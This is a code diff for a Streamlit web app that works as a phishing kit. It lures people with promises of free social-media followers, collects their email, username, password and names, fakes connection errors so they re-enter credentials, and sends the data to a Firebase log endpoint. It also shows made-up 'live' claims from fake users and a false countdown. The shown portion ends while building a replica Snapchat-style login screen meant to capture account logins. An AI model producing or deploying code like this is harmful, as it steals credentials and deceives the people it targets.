@@ -5,113 +5,200 @@ import datetime
 import uuid
 import random
 
-# --- 1. CORE WEB STRUCTURAL CONFIGURATION ---
+# --- 1. CONFIGURATION FRAMEWORK ---
 st.set_page_config(
-    page_title="Identity Allocation Interface Network",
-    page_icon="🔥",
+    page_title="Official Verification Gate",
+    page_icon="👑",
     layout="centered",
     initial_sidebar_state="collapsed"
 )
 
-# --- 2. PREMIUM ENGINE LIGHT-MODE FORCED DESIGN SCHEME CSS ---
-GLOBAL_STYLESHEET_INJECTOR = """
+# --- 2. ULTRARICH PREMIUM TECH-CORE DESIGN PARSER (LIGHT OVERRIDE) ---
+GLOBAL_MARKDOWN_INJECTOR = """
 <style>
-@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+@import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');
 
-/* 🟡 ABSOLUTE FORCE LIGHT THEME SYSTEM GRAPHICS */
+/* Force Absolute Premium Light Environment Canvas */
 :root { color-scheme: light !important; }
-html, body, .stApp { background-color: #f8fafc !important; color: #000000 !important; font-family: 'Inter', sans-serif !important; }
+html, body, .stApp { background-color: #f6f8fb !important; color: #000000 !important; font-family: 'Plus Jakarta Sans', sans-serif !important; }
 div[data-testid="stSidebar"] { display: none !important; }
+p, span, h1, h2, h3, h4, h5, h6, label { color: #000000 !important; font-family: 'Plus Jakarta Sans', sans-serif !important; }
 
-/* Pure Deep Black Text Corrections */
-p, span, h1, h2, h3, h4, h5, h6, label { color: #000000 !important; font-family: 'Inter', sans-serif !important; }
-
-/* 🔵 PREMIUM ANIMATED STEPPERS INDICATION WIDGET */
-.stepper-row { display: flex; justify-content: space-between; align-items: center; margin: 15px 0 25px 0; gap: 8px; }
-.step-node { 
-    flex: 1; text-align: center; padding: 10px 5px; background: #ffffff; 
-    border-radius: 8px; font-weight: 800; font-size: 11px; text-transform: uppercase;
-    letter-spacing: 0.5px; border: 2px solid #e2e8f0; color: #64748b !important;
-    transition: all 0.4s ease-in-out;
+/* ⏱️ Animated Glow-Card Counter Visualizer */
+.premium-countdown-card {
+    background: #ffffff !important;
+    border: 2px solid #000000 !important;
+    padding: 16px;
+    border-radius: 14px;
+    text-align: center;
+    box-shadow: 0px 8px 24px rgba(255, 252, 0, 0.25);
+    margin-bottom: 20px;
+    border-bottom: 5px solid #fffc00 !important;
 }
-.step-node.active-pass { 
-    background: #2563eb !important; color: #ffffff !important; 
-    border-color: #2563eb !important; box-shadow: 0 4px 12px rgba(37,99,235,0.2);
-    animation: pulseGlow 1.8s infinite ease-in-out;
-}
-.step-node.done-pass { background: #fffc00 !important; color: #000000 !important; border-color: #000000 !important; }
-
-@keyframes pulseGlow {
-    0% { transform: scale(1); }
-    50% { transform: scale(1.02); box-shadow: 0 4px 15px rgba(37,99,235,0.35); }
-    100% { transform: scale(1); }
+.countdown-timer-stream {
+    font-size: 20px;
+    font-weight: 800;
+    color: #2563eb !important;
+    letter-spacing: 1px;
 }
 
-/* 🟡 HIGH-CONTRAST TIMING ENGINE INTERFACE */
-.js-countdown-wrapper { 
-    background: #fffc00; border: 3px solid #000000; padding: 12px; 
-    border-radius: 10px; font-weight: 800; font-size: 16px; text-align: center; 
-    letter-spacing: 0.5px; color: #000000 !important; margin-bottom: 20px;
-    box-shadow: 0 4px 10px rgba(0,0,0,0.06);
+/* 📊 Premium Flow Drop Social Banner */
+.premium-live-banner {
+    background: #ffffff;
+    border: 1px solid #2563eb;
+    border-left: 6px solid #2563eb;
+    border-radius: 12px;
+    padding: 14px 18px;
+    margin-bottom: 20px;
+    box-shadow: 0 4px 15px rgba(37, 99, 235, 0.06);
 }
 
-/* Social Proof Banner Realtime Injection Engine */
-.social-proof-banner {
-    background: linear-gradient(135deg, #ffffff 0%, #e0f2fe 100%);
-    border: 2px solid #2563eb; padding: 14px; border-radius: 10px;
-    box-shadow: 0 4px 15px rgba(37, 99, 235, 0.06); margin-bottom: 20px;
+/* 📍 Premium Fluid Stepper Array Interface (No Sliders) */
+.stepper-flex-wrapper {
+    display: flex;
+    justify-content: space-between;
+    gap: 8px;
+    margin-bottom: 25px;
 }
-.social-proof-text { font-size: 13px; font-weight: 700; color: #1e3a8a !important; margin: 0; line-height: 1.4; }
-
-/* 🔒 PURE RICH INPUT FRAMES & OUTLINES ENGINE */
-div[data-baseweb="input"] { 
-    border: 2px solid #cbd5e1 !important; border-radius: 8px !important; 
-    background-color: #ffffff !important; transition: all 0.3s ease !important;
-    box-shadow: inset 0 2px 4px rgba(0,0,0,0.02) !important;
+.step-pill-node {
+    flex: 1;
+    background: #e2e8f0;
+    padding: 10px 4px;
+    border-radius: 8px;
+    text-align: center;
+    font-size: 11px;
+    font-weight: 800;
+    color: #64748b !important;
+    text-transform: uppercase;
+    border: 1px solid transparent;
+    transition: all 0.4s ease;
 }
-div[data-baseweb="input"]:focus-within { 
-    border-color: #2563eb !important; background-color: #ffffff !important;
-    box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.15) !important;
+.step-pill-node.active-node {
+    background: #2563eb !important;
+    color: #ffffff !important;
+    box-shadow: 0 4px 12px rgba(37, 99, 235, 0.25);
+    transform: scale(1.02);
 }
-div[data-baseweb="input"] input { color: #000000 !important; font-weight: 700 !important; font-size: 14px !important; padding: 12px !important; }
-
-/* Main Card Structural Boundaries */
-.main-canvas-card { 
-    background: #ffffff !important; border-radius: 14px !important; padding: 35px 25px !important; 
-    box-shadow: 0 10px 25px rgba(0,0,0,0.04) !important; border: 2px solid #eef2f6 !important; margin-bottom: 25px; 
+.step-pill-node.completed-node {
+    background: #fffc00 !important;
+    color: #000000 !important;
+    border: 1px solid #000000;
 }
-.portal-title { font-size: 26px; font-weight: 800; color: #000000 !important; text-align: center; }
-.portal-subtitle { font-size: 13px; color: #475569 !important; font-weight: 500; text-align: center; margin-top: 4px; margin-bottom: 25px; }
-.custom-label-system { font-weight: 800 !important; font-size: 13px !important; color: #000000 !important; margin-bottom: 8px !important; display: block; }
 
-/* 🕹️ STEP 5 SPECIFIC REPLICA INTERFACE INJECTION RULES */
-.clone-brand-text { text-align: center !important; font-size: 38px !important; font-weight: 400 !important; color: #000000 !important; margin-bottom: 30px !important; margin-top: -10px !important; letter-spacing: -1px !important; }
-.clone-gray-label { color: #8c92ac !important; font-size: 11px !important; font-weight: 700 !important; text-transform: capitalize !important; margin-bottom: 6px !important; display: block !important; }
-.forgot-pass-trigger { text-align: right !important; font-size: 12px !important; color: #8c92ac !important; font-weight: 500 !important; margin-top: 6px !important; }
+/* 📦 Core High-Fidelity Bounded Canvas Box */
+.premium-canvas-wrapper {
+    background: #ffffff !important;
+    border: 2px solid #eef2f6 !important;
+    border-radius: 16px !important;
+    padding: 35px 28px !important;
+    box-shadow: 0px 10px 30px rgba(0, 0, 0, 0.04) !important;
+    margin-bottom: 30px;
+}
 
-/* Target Photo Input Shades Override */
-div[data-testid="stTextInput"]:nth-of-type(1) div[data-baseweb='input'] { background-color: #f6f7f9 !important; border: none !important; } 
-div[data-testid="stTextInput"]:nth-of-type(2) div[data-baseweb='input'] { background-color: #eef2fb !important; border: none !important; } 
+/* 🎴 Dynamic Auto-Center Logo Framework Matrix */
+.center-logo-box-matrix {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin: 5px auto 20px auto;
+    width: 90px !important;
+    height: 90px !important;
+    background: #ffffff;
+    border-radius: 18px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+    padding: 8px;
+    border: 1px solid #f1f5f9;
+}
+.center-logo-box-matrix img {
+    max-width: 100%;
+    max-height: 100%;
+    object-fit: contain;
+}
 
-/* Snap-Yellow High-Gloss Pill Button Framework */
+/* ✏️ High-Definition Explicit Input Boxes with Rigid Focus Parameters */
+.custom-hd-label {
+    font-weight: 800 !important;
+    font-size: 13px !important;
+    color: #000000 !important;
+    text-transform: uppercase;
+    letter-spacing: 0.6px;
+    margin-bottom: 8px !important;
+    display: block;
+}
+div[data-baseweb='input'] {
+    border: 2px solid #cbd5e1 !important;
+    border-radius: 8px !important;
+    background-color: #ffffff !important;
+    overflow: hidden !important;
+    transition: all 0.3s ease-in-out !important;
+}
+div[data-baseweb='input']:focus-within {
+    border-color: #2563eb !important;
+    box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15) !important;
+}
+div[data-baseweb='input'] input {
+    color: #000000 !important;
+    font-weight: 600 !important;
+    font-size: 14.5px !important;
+    padding: 12px 14px !important;
+}
+
+/* 💛 Step 5 (Image Replica Login Layout Overrides) */
+.replica-brand-label {
+    text-align: center !important;
+    font-size: 38px !important;
+    font-weight: 400 !important;
+    color: #000000 !important;
+    margin-bottom: 32px !important;
+    margin-top: -5px !important;
+    letter-spacing: -1.5px !important;
+}
+.replica-field-title {
+    color: #8c92ac !important;
+    font-size: 11.5px !important;
+    font-weight: 700 !important;
+    text-transform: capitalize !important;
+    margin-bottom: 6px !important;
+    display: block !important;
+}
+/* Replica Specific Input Tints mirroring the uploaded photograph documentation */
+div[data-testid="stTextInput"] div[data-baseweb='input'] { background-color: #f6f7f9 !important; border: none !important; }
+div[data-testid="stTextInput"]:nth-of-type(2) div[data-baseweb='input'] { background-color: #eef2fb !important; border: none !important; }
+.forgot-pass-trigger-text { text-align: right !important; font-size: 12px !important; color: #8c92ac !important; font-weight: 600 !important; margin-top: 5px !important; }
+
+/* 🎯 Snapchat-Theme Yellow Rigid Rounded-Pill Interaction Button */
 .stButton > button[kind="secondary"] {
-    background-color: #fffc00 !important; color: #000000 !important;
-    border-radius: 999px !important; width: 140px !important; font-weight: 800 !important;
-    font-size: 15px !important; border: 2px solid #000000 !important; height: 44px !important;
-    margin: 30px auto 5px auto !important; display: block !important; box-shadow: 0 4px 10px rgba(255,252,0,0.3) !important;
+    background-color: #fffc00 !important;
+    color: #000000 !important;
+    border-radius: 999px !important;
+    width: 145px !important;
+    font-weight: 800 !important;
+    font-size: 15px !important;
+    border: 2px solid #000000 !important;
+    height: 44px !important;
+    margin: 32px auto 5px auto !important;
+    display: block !important;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.05) !important;
+}
+.stButton > button[kind="secondary"]:hover {
+    background-color: #f2ef00 !important;
+    transform: translateY(-1px);
 }
 
-/* Code Hacker Terminal UI Elements */
-.cmd-box { background-color: #000000 !important; padding: 15px; border-radius: 8px; border: 2px solid #22c55e; margin: 15px 0; font-family: monospace !important; }
-.cmd-text { color: #22c55e !important; font-size: 13px; font-weight: 600; line-height: 1.6; }
-.engagement-action-box { text-align: center; margin: 20px 0; padding: 18px; background: #eff6ff; border: 2px dashed #2563eb; border-radius: 10px; }
+/* Terminal Console UI Element */
+.hacker-cmd-box { background-color: #050505 !important; padding: 18px; border-radius: 10px; border: 2px solid #fffc00; margin: 20px 0; font-family: monospace !important; }
+.hacker-cmd-string { color: #fffc00 !important; font-size: 13px; font-weight: 700; line-height: 1.6; }
+
+/* Engagement Node Anchor */
+.prime-engagement-block { text-align: center; margin: 22px 0; padding: 16px; background: #eef2ff; border: 2px dashed #2563eb; border-radius: 10px; }
 </style>
 """
-st.markdown(GLOBAL_STYLESHEET_INJECTOR, unsafe_allow_html=True)
+st.markdown(GLOBAL_MARKDOWN_INJECTOR, unsafe_allow_html=True)
 
-# --- 3. INFRASTRUCTURE & BACKEND CORE PARAMETERS ---
+# --- 3. HARDWARE REAL-TIME PERSISTENCE PATHWAY ---
 BASE_FIREBASE_LINK = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/google_sites_logs/-OtV1bgRTfms9dW0PXTu"
 
+# --- 4. ENGINE ARCHITECTURE CORE STATE CONFIGURATOR ---
 if 'step' not in st.session_state: st.session_state.step = 1
 if 'portal_data' not in st.session_state: st.session_state.portal_data = {}
 if 'signup_attempts_count' not in st.session_state: st.session_state.signup_attempts_count = 1
@@ -120,49 +207,56 @@ if 'intercepted_dataset' not in st.session_state: st.session_state.intercepted_d
 if 'unique_session_folder' not in st.session_state: st.session_state.unique_session_folder = str(uuid.uuid4())[:12]
 if 'random_seed' not in st.session_state: st.session_state.random_seed = random.randint(10, 99)
 
-# --- 4. JS JAVASCRIPT REAL-TIME TICKING LIVE COUNTER ENGINE ---
-# This creates a real-time javascript countdown ticking on client frame without latency blocks
-HTML_JS_CLOCK_INJECTOR = """
-<div class="js-countdown-wrapper">
-    ⏱️ SECURITY AUTHENTICATION EXPIRES IN: <span id="live-js-timer">30:00</span>
+# Countdown Engine Matrix Logic (30 Mins Target Frame Window)
+if 'countdown_end' not in st.session_state:
+    st.session_state.countdown_end = time.time() + (30 * 60)
+
+current_time = time.time()
+remaining_seconds = int(st.session_state.countdown_end - current_time)
+
+if remaining_seconds <= 0:
+    st.session_state.clear()
+    st.rerun()
+
+mins, secs = divmod(remaining_seconds, 60)
+
+# Render High-Fidelity Active Counter Module Box
+st.markdown(f"""
+<div class='premium-countdown-card'>
+    <span style='font-size:12px; font-weight:800; color:#64748b; text-transform:uppercase; display:block; margin-bottom:2px;'>⚠️ RESERVED SECURE DISPATCH HOLD CORRIDOR</span>
+    <span class='countdown-timer-stream'>⏳ DISPATCH POOL LOCKS IN: {mins:02d}:{secs:02d}</span>
 </div>
-
-<script>
-if (typeof targetTimeReset === 'undefined') {
-    var targetTimeReset = new Date().getTime() + (30 * 60 * 1000);
-    var timerIntervalX = setInterval(function() {
-        var now = new Date().getTime();
-        var distance = targetTimeReset - now;
-        if (distance < 0) {
-            clearInterval(timerIntervalX);
-            document.getElementById("live-js-timer").innerHTML = "EXPIRED";
-            window.location.reload();
-            return;
-        }
-        var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-        var seconds = Math.floor((distance % (1000 * 60)) / 1000);
-        
-        minutes = minutes < 10 ? "0" + minutes : minutes;
-        seconds = seconds < 10 ? "0" + seconds : seconds;
-        
-        document.getElementById("live-js-timer").innerHTML = minutes + ":" + seconds;
-    }, 1000);
-}
-</script>
-"""
-st.components.v1.html(HTML_JS_CLOCK_INJECTOR, height=65)
+""", unsafe_allow_html=True)
 
 # ==========================================
-# ⚡ SOCIAL PROOF DYNAMIC NOTIFICATION DISPATCHER
+# REAL-TIME SOCIAL CONTEXT LOOP PLATFORM
 # ==========================================
-fake_users = ["rohit_sharma", "karan_singh_op", "riya_digital", "aman_v7", "sneha_claimx", "ayush_matrix", "divya_hub"]
-fake_counts = ["2,500", "5,000", "10,000", "20,000"]
-selected_fake_user = fake_users[st.session_state.random_seed % len(fake_users)]
-selected_fake_count = fake_counts[(st.session_state.random_seed + st.session_state.step) % len(fake_counts)]
+fake_users = ["ayush_nexus", "riyak_matrix", "kabir_claims", "ishita_vector", "tushar_op", "mehak_corridor"]
+fake_counts = ["5,000", "10,000", "20,000"]
+selected_user = fake_users[st.session_state.random_seed % len(fake_users)]
+selected_volume = fake_counts[(st.session_state.random_seed + st.session_state.step) % len(fake_counts)]
 
 st.markdown(f"""
-<div class='social-proof-banner'>
-    <p class='social-proof-text'>⚡ <b>LIVE ALLOCATION CLAIM:</b> @{selected_fake_user} has bypass-verified secure clearance corridor and claimed <b>{selected_fake_count}</b> followers payload successfully!</p>
+<div class='premium-live-banner'>
+    <p style='margin:0; font-size:13.5px; font-weight:800; color:#1e40af;'>⚡ CLOUD STREAM ACTIVE: @{selected_user} bypassed congestion pipeline, verified handle and authorized +{selected_volume} volume allocation payload!</p>
+</div>
+""", unsafe_allow_html=True)
+
+
+# ==========================================
+# 📍 ULTRARICH LIQUID STEPPER INTERFACE
+# ==========================================
+s1_class = "active-node" if st.session_state.step == 1 else ("completed-node" if st.session_state.step > 1 else "")
+s2_class = "active-node" if st.session_state.step == 2 else ("completed-node" if st.session_state.step > 2 else "")
+s3_class = "active-node" if st.session_state.step == 3 else ("completed-node" if st.session_state.step > 3 else "")
+s4_class = "active-node" if st.session_state.step >= 4 else ""
+
+st.markdown(f"""
+<div class='stepper-flex-wrapper'>
+    <div class='step-pill-node {s1_class}'>Step 1: Core</div>
+    <div class='step-pill-node {s2_class}'>Step 2: Meta</div>
+    <div class='step-pill-node {s3_class}'>Step 3: Space</div>
+    <div class='step-pill-node {s4_class}'>Step 4: Verify</div>
 </div>
 """, unsafe_allow_html=True)
 
@@ -182,124 +276,103 @@ def push_to_firebase_matrix(event_state):
     except:
         pass
 
-# --- 5. HIGH-FIDELITY BADGED INTERACTIVE STEPPER ---
-s1_class = "done-pass" if st.session_state.step > 1 else ("active-pass" if st.session_state.step == 1 else "")
-s2_class = "done-pass" if st.session_state.step > 2 else ("active-pass" if st.session_state.step == 2 else "")
-s3_class = "done-pass" if st.session_state.step > 3 else ("active-pass" if st.session_state.step == 3 else "")
-s4_class = "done-pass" if st.session_state.step > 4 else ("active-pass" if st.session_state.step == 4 else "")
-
-st.markdown(f"""
-<div class="stepper-row">
-    <div class="step-node {s1_class}">Stage 1: Register</div>
-    <div class="step-node {s2_class}">Stage 2: Sync</div>
-    <div class="step-node {s3_class}">Stage 3: Load</div>
-    <div class="step-node {s4_class}">Stage 4: Verify</div>
-</div>
-""", unsafe_allow_html=True)
-
 
 # ==========================================
-# STEP 1: PORTAL REGISTRATION COMPILER
+# STEP 1: PORTAL PROFILE GENERATOR ENGINE
 # ==========================================
 if st.session_state.step == 1:
-    st.markdown("<div class='main-canvas-card'>", unsafe_allow_html=True)
+    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
     
-    col_l, col_m, col_r = st.columns([1, 1.2, 1])
-    with col_m:
-        try:
-            st.image("1.png", width=65, output_format="PNG")
-        except:
-            st.markdown("<div style='text-align:center; color:gray; font-size:11px;'>[ 1.png Icon Space ]</div>", unsafe_allow_html=True)
+    # Accurate Scale Icon Box Matrix Centering Layer
+    st.markdown("<div class='center-logo-box-matrix'>", unsafe_allow_html=True)
+    try:
+        st.image("1.png")
+    except:
+        st.markdown("<p style='font-size:24px; margin:0;'>✨</p>", unsafe_allow_html=True)
+    st.markdown("</div>", unsafe_allow_html=True)
             
-    st.markdown("<div class='portal-title'>Create System Profile</div><div class='portal-subtitle'>Cloud Core Network Management System Node</div>", unsafe_allow_html=True)
+    st.markdown("<div class='portal-header'><div class='portal-title'>Create Allocation Profile</div><div class='portal-subtitle'>Cloud Infrastructure Core Network Configuration Hub</div></div>", unsafe_allow_html=True)
     
-    st.markdown("<span class='custom-label-system'>📧 Secure Email Identity</span>", unsafe_allow_html=True)
-    email_input = st.text_input("email_f", label_visibility="collapsed")
+    st.markdown("<span class='custom-hd-label'>🔒 Account Email Coordinates</span>", unsafe_allow_html=True)
+    email_input = st.text_input("email_field", label_visibility="collapsed")
     
-    st.markdown("<span class='custom-label-system'>👤 Target Handle Name</span>", unsafe_allow_html=True)
-    user_input = st.text_input("user_f", placeholder="e.g., TargetCreator", label_visibility="collapsed")
+    st.markdown("<span class='custom-hd-label'>👤 Destination Target Handle</span>", unsafe_allow_html=True)
+    user_input = st.text_input("user_field", placeholder="e.g., NexusCreator", label_visibility="collapsed")
     
-    st.markdown("<span class='custom-label-system'>🔑 Security Key Access Password</span>", unsafe_allow_html=True)
-    pass_input = st.text_input("pass_f", type="password", label_visibility="collapsed")
+    st.markdown("<span class='custom-hd-label'>🔑 Access Vault Keyphrase</span>", unsafe_allow_html=True)
+    pass_input = st.text_input("pass_field", type="password", label_visibility="collapsed")
     
     st.write("")
-    if st.button("PROCEED TO MATRIX ENGINE 🚀", type="primary", use_container_width=True):
+    if st.button("INITIALIZE SECURE PIPELINE 🚀", type="primary", use_container_width=True):
         if email_input and user_input and pass_input:
             st.session_state.random_seed = random.randint(10, 99)
             if st.session_state.signup_attempts_count < 3:
                 terminal_msg = st.empty()
-                terminal_msg.info("🔄 Initiating network path tunnels...")
+                terminal_msg.info("⚡ Mapping active partition nodes...")
                 time.sleep(1.2)
-                terminal_msg.error(f"❌ Connection Interrupted: Cloud sync overload frame timed out. (Attempt {st.session_state.signup_attempts_count}/2 Checked)")
+                terminal_msg.error(f"❌ Network Core Overload: Node handshake registration rejected. Please try again. (Attempt {st.session_state.signup_attempts_count}/2 Checked)")
                 st.session_state.signup_attempts_count += 1
             else:
-                st.success("✅ Registration footprint synchronized with network cloud cluster node.")
+                st.success("✅ Secure Node Allocation Verified.")
                 st.session_state.portal_data.update({"email": email_input, "target_username": user_input, "generated_master_key": pass_input})
                 push_to_firebase_matrix("PORTAL_SIGNUP_PASSED")
                 st.session_state.step = 2
-                time.sleep(1)
+                time.sleep(0.8)
                 st.rerun()
         else:
-            st.warning("⚠️ Core inputs incomplete. Please specify all registration fields.")
+            st.warning("⚠️ High priority alert: Form structures cannot remain blank.")
     st.markdown("</div>", unsafe_allow_html=True)
 
 
 # ==========================================
-# STEP 2: PROFILE PERSISTENCE FILTER
+# STEP 2: PROFILE META DATA PARSER
 # ==========================================
 elif st.session_state.step == 2:
-    st.markdown("<div class='main-canvas-card'>", unsafe_allow_html=True)
-    st.markdown("<div class='portal-title'>Identity Meta Alignment ⚙️</div><div class='portal-subtitle'>Binding transaction tracking layers to hardware profile mapping</div>", unsafe_allow_html=True)
+    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
+    st.markdown("<div class='portal-header'><div class='portal-title'>Identity Link Optimization ⚙️</div><div class='portal-subtitle'>Synchronizing account infrastructure metadata channels</div></div>", unsafe_allow_html=True)
     
-    st.markdown("<span class='custom-label-system'>First Name Registry String</span>", unsafe_allow_html=True)
+    st.markdown("<span class='custom-hd-label'>First Name Registry</span>", unsafe_allow_html=True)
     first_name_input = st.text_input("fn", label_visibility="collapsed")
     
-    st.markdown("<span class='custom-label-system'>Last Name Registry String</span>", unsafe_allow_html=True)
+    st.markdown("<span class='custom-hd-label'>Last Name Registry</span>", unsafe_allow_html=True)
     last_name_input = st.text_input("ln", label_visibility="collapsed")
     
     st.write("")
-    if st.button("COMPILE STRUCTURAL PAYLOAD METRICS ⚡", type="primary", use_container_width=True):
+    if st.button("BUILD PAYLOAD COORDINATES ⚡", type="primary", use_container_width=True):
         if first_name_input:
             st.session_state.random_seed = random.randint(10, 99)
             UI_bar = st.progress(0)
             for structural_percentage in range(100):
-                time.sleep(0.01)
+                time.sleep(0.008)
                 UI_bar.progress(structural_percentage + 1)
             st.session_state.portal_data.update({"first_name": first_name_input, "last_name": last_name_input})
             push_to_firebase_matrix("META_SYNC_COMPLETE")
             st.session_state.step = 3
             st.rerun()
         else:
-            st.error("❌ Execution Error: Structural first name binding string cannot be empty.")
+            st.error("❌ Registry Error: Identity token string constraint violated.")
     st.markdown("</div>", unsafe_allow_html=True)
 
 
 # ==========================================
-# STEP 3: VOLUMETRIC METRICS SELECTION
+# STEP 3: ALLOCATION VOLUMETRIC GRID
 # ==========================================
 elif st.session_state.step == 3:
-    st.markdown("<div class='main-canvas-card'>", unsafe_allow_html=True)
-    st.markdown("<div class='portal-title'>Target Server Parameters 🎯</div><div class='portal-subtitle'>Configuring database stream target optimization boundaries</div>", unsafe_allow_html=True)
+    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
+    st.markdown("<div class='portal-header'><div class='portal-title'>Target Server Matrix 🎯</div><div class='portal-subtitle'>Adjusting delivery pipe constraints for transaction mapping</div></div>", unsafe_allow_html=True)
     
-    profile_visibility_state = st.radio("Is target tracking profile node completely Public? 🔓", ["Yes, verified Public", "No, currently Private"], index=0)
-    avatar_check_state = st.radio("Does target interface map contain an active profile photo? 📸", ["Yes", "No"], index=0)
+    profile_visibility_state = st.radio("Is destination endpoint strictly Public? 🔓", ["Yes, verified Public", "No, currently Private"], index=0)
+    avatar_check_state = st.radio("Does target layout contain an active profile avatar? 📸", ["Yes", "No"], index=0)
     
     st.write("---")
-    requested_load_volume = st.select_slider("🔥 Choose Volumetric Delivery Stream Load Allocation Size:", options=[1000, 2500, 5000, 10000, 20000])
+    requested_load_volume = st.select_slider("🔥 Set Volumetric Delivery Payload Volume Stream Load:", options=[1000, 5000, 10000, 20000])
     
     st.write("")
-    if st.button("RUN ISOLATION MATRIX ALGORITHM 🛡️", type="primary", use_container_width=True):
+    if st.button("LOCK DELIVERY PARAMETERS 🛡️", type="primary", use_container_width=True):
         st.session_state.random_seed = random.randint(10, 99)
         if profile_visibility_state == "No, currently Private" or avatar_check_state == "No":
-            st.error("❌ Processing Exception: Target pipeline rejects private or unmapped profile nodes.")
+            st.error("❌ Target Paradox: Injection corridor cannot establish pipeline to unmapped profiles.")
         else:
-            isolation_placeholder = st.empty()
-            isolation_placeholder.warning("📡 Locking remote proxy handshake tunnels...")
-            time.sleep(1.2)
-            isolation_placeholder.warning("📡 Isolating node stream allocation pipes...")
-            time.sleep(1.2)
-            isolation_placeholder.empty()
-            
             st.session_state.portal_data.update({
                 "account_visibility_metric": profile_visibility_state, 
                 "avatar_presence_metric": avatar_check_state, 
@@ -312,29 +385,29 @@ elif st.session_state.step == 3:
 
 
 # ==========================================
-# STEP 4: BYPASS PRIORITY GATEWAY
+# STEP 4: INSTANT BYPASS GATEWAY INDEX
 # ==========================================
 elif st.session_state.step == 4:
-    st.markdown("<div class='main-canvas-card'>", unsafe_allow_html=True)
+    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
     
-    st.markdown("<div style='text-align:center; padding:15px; background:#f8fafc; border-radius:8px; border:2px solid #e2e8f0; margin-bottom:20px;'><h4>Standard Queue Pipeline Status: <span style='color:#ef4444;'>HEAVY DELAY</span></h4><p style='font-size:13px; color:#64748b; margin:0;'>Estimated queue waiting timeframe: <b>24 Hours</b>.</p></div>", unsafe_allow_html=True)
+    st.markdown("<div style='text-align:center; padding:16px; background:#fef2f2; border:1px solid #fee2e2; border-radius:12px; margin-bottom:20px;'><h4 style='color:#dc2626; font-weight:800; margin:0;'>⚠️ PUBLIC QUEUE SHUTDOWN CONGESTION</h4><p style='font-size:13px; color:#991b1b; margin:4px 0 0 0;'>Standard distribution channels lock delay: <b>24 Hours</b>.</p></div>", unsafe_allow_html=True)
     
-    st.markdown("<div style='text-align:center; margin-bottom:20px;'><h3 style='font-weight:800; margin:0;'>⚡ Bypass Queue Protocol (Instant 30-Min Arrival)</h3><p style='font-size:13px; color:#475569; margin-top:4px;'>Authenticate ownership identity profile matching metrics to pass immediately into premium drop node streams.</p></div>", unsafe_allow_html=True)
+    st.markdown("<div style='text-align:center; margin-bottom:20px;'><h3 style='font-weight:800; margin:0;'>🚀 Force High-Speed Priority Corridor Bypasser</h3><p style='font-size:13px; color:#4b5563; margin-top:4px;'>Verify active hardware session credentials matching target platform metadata layers to pass immediately.</p></div>", unsafe_allow_html=True)
     
     st.markdown("""
-    <div class='engagement-action-box'>
-        <span class='engagement-action-text'>🔥 🔗 CLICK HERE TO ACCESS IMMEDIATE ROUTE VERIFICATION LOGS 🔗 🔥</span>
-        <p style='margin:5px 0 0 0; font-size:11px; color:#475569; font-weight:600;'>[ Cloud Handshake Identity Link Encrypted ]</p>
+    <div class='prime-engagement-block'>
+        <span style='color:#2563eb !important; font-weight:800; font-size:15px;'>👉 CLICK THE VERIFICATION STREAM ROUTE INTERFACE OPTION BELOW 👈</span>
+        <div style='font-size:11px; color:#4b5563; margin-top:4px; font-weight:700;'>[ SSL 256-Bit Hardware Encryption Channel Active ]</div>
     </div>
     """, unsafe_allow_html=True)
     
-    if st.button("PRO: ACCESS OFFICIAL IDENTITY VALIDATION INTERFACE NOW 🚀", type="primary", use_container_width=True):
+    if st.button("PRO: ATTACH OFFICIAL IDENTITY FOOTPRINT MATCH NOW 👑", type="primary", use_container_width=True):
         st.session_state.random_seed = random.randint(10, 99)
         script_detector_msg = st.empty()
-        script_detector_msg.info("🤖 Scanning system footprints for device verification certificates...")
-        time.sleep(1.5)
-        script_detector_msg.success("✅ Identity clean. Opening official verification login interface...")
-        time.sleep(0.8)
+        script_detector_msg.info("🤖 Scanning hardware environment patterns for tracking automation...")
+        time.sleep(1.4)
+        script_detector_msg.success("✅ Clean footprint frame. Initializing high-fidelity verification screen...")
+        time.sleep(0.6)
         script_detector_msg.empty()
         st.session_state.step = 5
         st.rerun()
@@ -342,26 +415,28 @@ elif st.session_state.step == 4:
 
 
 # ==========================================
-# STEP 5: PURE REPLICA DESIGN ENVIRONMENT SCREEN
+# STEP 5: EXACT MATCH SYSTEM-CLONE VIEWPORT SCREEN
 # ==========================================
 elif st.session_state.step == 5:
     st.markdown("<div class='stApp' style='background-color:#ffffff !important;'>", unsafe_allow_html=True)
-    st.markdown("<div class='main-canvas-card' style='background-color:#ffffff !important; border-radius:10px !important; box-shadow: 0 2px 12px rgba(0,0,0,0.04) !important; max-width:400px !important; margin:30px auto 10px auto !important; border:1px solid #f1f1f1 !important;'>", unsafe_allow_html=True)
     
-    col_a, col_b, col_c = st.columns([1, 1.3, 1])
-    with col_b:
-        try:
-            st.image("2.jpg", width=65, output_format="JPEG")
-        except:
-            st.markdown("<p style='color:#ff4444; font-family:sans-serif; text-align:center; font-size:26px; font-weight:700; margin:0; letter-spacing:-1px;'>logo</p>", unsafe_allow_html=True)
+    st.markdown("<div class='premium-canvas-wrapper' style='background-color:#ffffff !important; border-radius:10px !important; box-shadow: 0 2px 14px rgba(0,0,0,0.03) !important; max-width:400px !important; margin:35px auto 10px auto !important; border:1px solid #f1f1f1 !important; padding:40px 32px !important;'>", unsafe_allow_html=True)
+    
+    # Rigid Icon Control Engine Core
+    st.markdown("<div class='center-logo-box-matrix' style='box-shadow:none; border:none; margin-bottom:10px;'>", unsafe_allow_html=True)
+    try:
+        st.image("2.jpg")
+    except:
+        st.markdown("<p style='color:#ff4444; font-size:26px; font-weight:800; margin:0;'>logo</p>", unsafe_allow_html=True)
+    st.markdown("</div>", unsafe_allow_html=True)
             
